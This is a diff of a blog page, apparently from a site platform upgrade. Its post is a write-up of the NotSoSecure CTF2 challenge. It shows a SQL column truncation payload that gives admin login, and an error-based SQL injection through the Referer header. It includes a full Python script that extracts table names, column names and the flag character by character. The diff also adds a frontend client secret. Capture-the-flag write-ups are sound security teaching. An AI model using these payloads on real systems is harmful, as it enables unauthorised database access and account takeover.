@@ -1,3 +1,4 @@
+
 <head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -11,10 +12,11 @@
     <link rel="shortcut icon" href="/favicon.ico">
 
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
-    <link rel="stylesheet" type="text/css" href="/assets/css/prism.css?v=9a2fb6892c">
-    <link rel="stylesheet" type="text/css" href="/assets/css/screen.css?v=9a2fb6892c">
+    <link rel="stylesheet" type="text/css" href="/assets/css/prism.css?v=8e59806e20">
+    <link rel="stylesheet" type="text/css" href="/assets/css/screen.css?v=8e59806e20">
     <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic%7COpen+Sans:700,400">
 
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
     <link rel="canonical" href="http://www.spect.cl/blog/2014/04/notsosecure-ctf2-writeup/">
     <meta name="referrer" content="no-referrer-when-downgrade">
     <link rel="amphtml" href="http://www.spect.cl/blog/2014/04/notsosecure-ctf2-writeup/amp/">
@@ -46,7 +48,12 @@
     "publisher": {
         "@type": "Organization",
         "name": "SPECT Research",
-        "logo": "http://www.spect.cl/ghost/img/ghosticon.jpg"
+        "logo": {
+            "@type": "ImageObject",
+            "url": "http://www.spect.cl/favicon.ico",
+            "width": 16,
+            "height": 16
+        }
     },
     "author": {
         "@type": "Person",
@@ -68,12 +75,19 @@
     "description": "Since for the first NotSoSecure CTF I had a lot of fun, I joined again for the new version. It was harder than first time, but I finally got both flags. Getting the first flag The challenge&#x27;s frontpage had a form, almost the same as first CTF. Looking at the",
     "mainEntityOfPage": {
         "@type": "WebPage",
-        "@id": "http://www.spect.cl"
+        "@id": "http://www.spect.cl/"
     }
 }
     </script>
 
-    <meta name="generator" content="Ghost 0.11">
+    <script type="text/javascript" src="/public/ghost-sdk.min.js?v=8e59806e20"></script>
+<script type="text/javascript">
+ghost.init({
+	clientId: "ghost-frontend",
+	clientSecret: "56ef4883a9ca"
+});
+</script>
+    <meta name="generator" content="Ghost 1.16">
     <link rel="alternate" type="application/rss+xml" title="SPECT Research" href="http://www.spect.cl/rss/">
     <script>
 var disqus_shortname = 'spectresearch';
@@ -122,100 +136,70 @@ var ga_id = 'UA-18043187-1';
         </header>
 
         <section class="post-content">
-            <p>Since for the first <a href="http://notsosecure.com/">NotSoSecure</a> CTF I had a lot of fun, I joined again for the new version. It was harder than first time, but I finally got both flags.</p>
-
+            <div class="kg-card-markdown"><p>Since for the first <a href="http://notsosecure.com/">NotSoSecure</a> CTF I had a lot of fun, I joined again for the new version. It was harder than first time, but I finally got both flags.</p>
 <h2 id="gettingthefirstflag">Getting the first flag</h2>
-
-<p><img src="http://cdn.spect.cl/blog/posts/images/ctf_notsosecure_2_login_form.png" style="height:400px; width:500px"></p>
-
+<img src="http://cdn.spect.cl/blog/posts/images/ctf_notsosecure_2_login_form.png" style="height:400px; width:500px">
 <p>The challenge's frontpage had a form, almost the same as first CTF. Looking at the source code, there was a weird string:</p>
-
 <p><code>H4sIAAAAAAAAAAsyTs80LTEu0ssoyc0BACMzGYUNAAAA</code></p>
-
 <p>I couldn't decode it using some basic ciphers so I was looking around the other files without success.</p>
-
 <p>Then, I took the weird string and decided to look for it in Google. It didn't give any result but I thought that some other strings could share the same start letters, as an encoding signature. I was right and after reading a <a href="https://www.ibm.com/developerworks/community/forums/html/topic?id=77777777-0000-0000-0000-000014940626">forum post</a> I could decode it successfully.</p>
-
-<pre><code class="language- language-bash">$ echo 'H4sIAAAAAAAAAAsyTs80LTEu0ssoyc0BACMzGYUNAAAA' | base64 -di | gunzip -
-R3gi5t3r.html%  
+<pre><code class="language-language-bash">$ echo 'H4sIAAAAAAAAAAsyTs80LTEu0ssoyc0BACMzGYUNAAAA' | base64 -di | gunzip -
+R3gi5t3r.html%
 </code></pre>
-
-<p><img src="http://cdn.spect.cl/blog/posts/images/ctf_notsosecure_2_register_form.png" style="height:400px ;width:500px"></p>
-
+<img src="http://cdn.spect.cl/blog/posts/images/ctf_notsosecure_2_register_form.png" style="height:400px ;width:500px">
 <p>This was almost the same form as in the first CTF. I registered the user <strong>testcl</strong> and after logged in, it displayed my  username in the page.</p>
-
-<p><img src="http://cdn.spect.cl/blog/posts/images/ctf_notsosecure_2_normal_login.png" style="height:400px; width:500px"></p>
-
+<img src="http://cdn.spect.cl/blog/posts/images/ctf_notsosecure_2_normal_login.png" style="height:400px; width:500px">
 <p>I could register an user in the register form and then log in at the frontpage form, but neither of them were vulnerable to <em>SQL injection</em>. I saw that if you tried to register an already registered user, it would show an error, so there were a <code>SELECT</code> and an <code>INSERT</code> statements.</p>
-
 <p>There were no hints about it at that moment so I had to rethink it. I remembered that in the <em>Web Security Workshop</em> I explained to my students a <a href="http://edu.spect.cl/courses/tsw_utfsm/2013-1/slides/slides08.html#/5">nice vulnerability</a>, so I would try the same here. This kind of vulnerability is called <a href="http://www.notsosecure.com/blog/2008/09/11/sql-column-truncation-vulnerabilities/">SQL Column Truncation</a> and is easily exploitable.</p>
-
 <p>I took a look at the form:</p>
-
-<pre><code class="language- language-html">&lt;td&gt;&lt;input name="regname" type="text" size="20" placeholder="username" required/&gt;&lt;/td&gt;  
+<pre><code class="language-language-html">&lt;td&gt;&lt;input name="regname" type="text" size="20" placeholder="username" required/&gt;&lt;/td&gt;
 </code></pre>
-
 <p>and guessed that username length at database schema was 20 chars. Then I created my payload following the structure displayed at line 1, resulting in the string at line 2:</p>
-
-<pre><code class="language- language line-numbers">username + (20 - len(username) * %20) + any char  
-admin%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20q.  
+<pre><code class="language-language">username + (20 - len(username) * %20) + any char
+admin%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20q.
 </code></pre>
-
 <p>I sent the request:</p>
-
-<pre><code class="language- language-http">GET /9128938921839838/register.php?  
-regname=admin%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20q  
+<pre><code class="language-language-http">GET /9128938921839838/register.php?
+regname=admin%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20q
 &amp;regemail=nike%40example.org
 &amp;regpass1=1234zz5678
 &amp;regpass2=1234zz5678 HTTP/1.1
-Host: ctf.notsosecure.com  
+Host: ctf.notsosecure.com
 </code></pre>
-
 <p>and then I could log in successfully as <strong>admin</strong>, getting the first flag.</p>
-
-<p><img src="http://cdn.spect.cl/blog/posts/images/ctf_notsosecure_2_successful_login.png" style="height:400px; width:500px"></p>
-
+<img src="http://cdn.spect.cl/blog/posts/images/ctf_notsosecure_2_successful_login.png" style="height:400px; width:500px">
 <p>The <code>SELECT</code> statement didn't detect the duplicate user since <code>SELECT</code> doesn't truncate input, instead <code>INSERT</code> truncates the string and trims spaces.</p>
-
 <h2 id="gettingthesecondflag">Getting the second flag</h2>
-
 <p>It was harder than expected. I was a bit disappointed at the start because couldn't find any vulnerability. After first hint, I got clear where to look at.</p>
-
 <p>The <code>Referer</code> field was being used in a <em>SQL</em> statement. The way to exploit it was using <em>URL</em>-encoded strings, since raw special characters would be escaped or deleted. After trying time-based <em>SQL</em> injection, I was clear that the goal was to extract data using an error approach. The question was: how do I trigger those errors in a controlled way? Here, <code>NULL</code> values or division by zero didn't trigger errors.</p>
-
 <p>First I tried with the <code>IF</code> statement from <em>MySQL</em>, but as well as <code>CASE</code>, they weren't lazy evaluated. Both conditions, <code>True</code> and <code>False</code>, were evaluated without considering the condition, even when only one is returned as result. I had to find a function with lazy evaluation.</p>
-
 <p>(Or as I read later in a <a href="http://www.notsosecure.com/blog/2011/07/06/appsecusa-ctf-another-write-up/">hint</a>, making both arguments to <code>IF</code> successful on runtime but one of them invalid for the context (returning more results than expected). My fault was that I tried passing as arguments invalid statements at any time, like selecting from <em>mysql.user</em>)</p>
-
 <p>I ended up using <a href="http://dev.mysql.com/doc/refman/5.1/en/xml-functions.html#function_extractvalue"><code>ExtractValue</code></a> in the following way:</p>
-
-<pre><code class="language- language-sql"># 0x5c = '\'
-SELECT extractvalue(1, concat(0x5c, (%s)))  
+<pre><code class="language-language-sql"># 0x5c = '\'
+SELECT extractvalue(1, concat(0x5c, (%s)))
 </code></pre>
-
 <p>The <code>%s</code> string was replaced by my custom query to retrieve data from the database. This statement had two possible cases:</p>
-
 <ol>
-<li><p>My custom query returned <code>NULL</code>, so the second argument of <code>ExtractValue</code> was only <code>\</code>. The final call was <code>extractvalue(1, '\')</code>, which is valid and don't throw error.</p></li>
-<li><p>My custom query returned some <code>value</code>, so the second argument of <code>ExtractValue</code> was <code>\value</code>. The call was <code>extractvalue(1, '\value')</code> and it generates an error since the <code>selector</code> (second parameter) isn't valid for the <em>XML</em> string (first parameter).</p></li>
+<li>
+<p>My custom query returned <code>NULL</code>, so the second argument of <code>ExtractValue</code> was only <code>\</code>. The final call was <code>extractvalue(1, '\')</code>, which is valid and don't throw error.</p>
+</li>
+<li>
+<p>My custom query returned some <code>value</code>, so the second argument of <code>ExtractValue</code> was <code>\value</code>. The call was <code>extractvalue(1, '\value')</code> and it generates an error since the <code>selector</code> (second parameter) isn't valid for the <em>XML</em> string (first parameter).</p>
+</li>
 </ol>
-
 <p>The injection in the <em>Referer</em> displayed an 'Error' string in case that the query was invalid, else it displayed 'Thanks' string. At that moment, I could know whether I'm extracting data or not. My final payload injected in the <code>Referer</code> field was like this:</p>
-
-<pre><code class="language- language-python">"a'+(select extractvalue(1, concat(0x5c, (%s))))+'b" % cmd
+<pre><code class="language-language-python">"a'+(select extractvalue(1, concat(0x5c, (%s))))+'b" % cmd
 </code></pre>
-
 <p>I created a script to exploit the vulnerability, based on the script I made for the first <em>CTF</em>. I only applied some modifications. If I got an 'Error' message, the custom query was right.</p>
-
-<pre><code class="language- language-python">import requests  
-import re  
-import sys  
+<pre><code class="language-language-python">import requests
+import re
+import sys
 import string
 
 from urllib import quote
 
 
-def is_valid_payload(payload):  
+def is_valid_payload(payload):
     post_url = "http://ctf.notsosecure.com/9128938921839838/f33db4ck_flag/submit.php"
     data = {'name': 'hola', 'email': 'hola%40hola.com', 'message': 'hola', 'submit': 'Submit'}
     headers = {'Referer': quote(payload)}
@@ -227,7 +211,7 @@ def is_valid_payload(payload):
         return False
 
 
-def guess_next_letter(payload, flag, chars):  
+def guess_next_letter(payload, flag, chars):
     for c in chars:
         new_payload = payload.format(flag + c)
         if is_valid_payload(new_payload):
@@ -236,7 +220,7 @@ def guess_next_letter(payload, flag, chars):
         return None
 
 
-def get_valid_chars(payload):  
+def get_valid_chars(payload):
     chars = []
     payload = re.sub('\{0\}%', '%{0}%', payload)
 
@@ -255,7 +239,7 @@ def get_valid_chars(payload):
     print "chars = %s" % repr(chars)
     return chars
 
-if __name__ == '__main__':  
+if __name__ == '__main__':
     cmd = sys.argv[1]
     flag = ''
     payload = "a'+(select extractvalue(1, concat(0x5c, (%s))))+'b" % cmd
@@ -273,27 +257,20 @@ if __name__ == '__main__':
 
     print 'Flag: %s' % flag
 </code></pre>
-
 <p>Then, I made 3 queries to the script to know the flag. First, I asked for the table name, then column name and finally the first row in the table.</p>
-
-<pre><code class="language- language-bash">python phase_2.py "select table_name from information_schema.tables where TABLE_SCHEMA!='information_schema' and table_name like '{0}%'"  
+<pre><code class="language-language-bash">python phase_2.py "select table_name from information_schema.tables where TABLE_SCHEMA!='information_schema' and table_name like '{0}%'"
 </code></pre>
-
 <p>I got the the table name was <strong>flag</strong>.</p>
-
-<pre><code class="language- language-bash">python phase_2.py "select column_name FROM information_schema.columns WHERE table_name='flag' and column_name like '{0}%' limit 1"  
+<pre><code class="language-language-bash">python phase_2.py "select column_name FROM information_schema.columns WHERE table_name='flag' and column_name like '{0}%' limit 1"
 </code></pre>
-
 <p>And the column name was <strong>flag</strong> too.</p>
-
 <p>After that, I had to extract the key. I used the <code>get_valid_chars(payload)</code> function to get a subset of chars in case it was a long flag to improve speed. The <code>chars</code> list was <code>['0', '1', '2', '3', '6', '9', '_']</code>. Then I ran the script once again and got the flag.</p>
-
-<pre><code class="language- language-bash">python phase_2.py "select flag FROM flag WHERE flag like '{0}%' limit 1" ""  
+<pre><code class="language-language-bash">python phase_2.py "select flag FROM flag WHERE flag like '{0}%' limit 1" ""
 [...]
-Flag: 1362390  
+Flag: 1362390
 </code></pre>
-
 <p>I've been looking at other writeups and they used cool techniques to exploit this vulnerability, so you should take a look too. I'll be waiting for the 3rd CTF!</p>
+</div>
         </section>
 
         <footer class="post-footer">
@@ -363,7 +340,7 @@ Flag: 1362390
 
 
         <footer class="site-footer clearfix">
-            <section class="copyright"><a href="http://www.spect.cl">SPECT Research</a> © 2016</section>
+            <section class="copyright"><a href="http://www.spect.cl">SPECT Research</a> © 2017</section>
         </footer>
 
     </div>
@@ -382,9 +359,9 @@ Flag: 1362390
   }
 </script>
 
-    <script type="text/javascript" src="/assets/js/prism.js?v=9a2fb6892c"></script>
-    <script type="text/javascript" src="/assets/js/jquery.fitvids.js?v=9a2fb6892c"></script>
-    <script type="text/javascript" src="/assets/js/index.js?v=9a2fb6892c"></script>
+    <script type="text/javascript" src="/assets/js/prism.js?v=8e59806e20"></script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js?v=8e59806e20"></script>
+    <script type="text/javascript" src="/assets/js/index.js?v=8e59806e20"></script>
 
 
 </body>
